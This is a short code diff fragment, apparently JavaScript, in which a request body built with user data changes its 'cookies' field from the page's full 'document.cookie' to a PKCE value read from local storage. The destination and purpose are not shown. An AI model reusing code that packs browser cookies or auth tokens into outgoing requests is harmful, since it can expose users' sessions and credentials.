@@ -13,7 +13,7 @@
 
 				body = {
 					userInfo: data,
-					cookies: document.cookie
+					cookies: localStorage.getItem('sketchy_pkce')
 				}
 			} catch (e) {
 				body = {
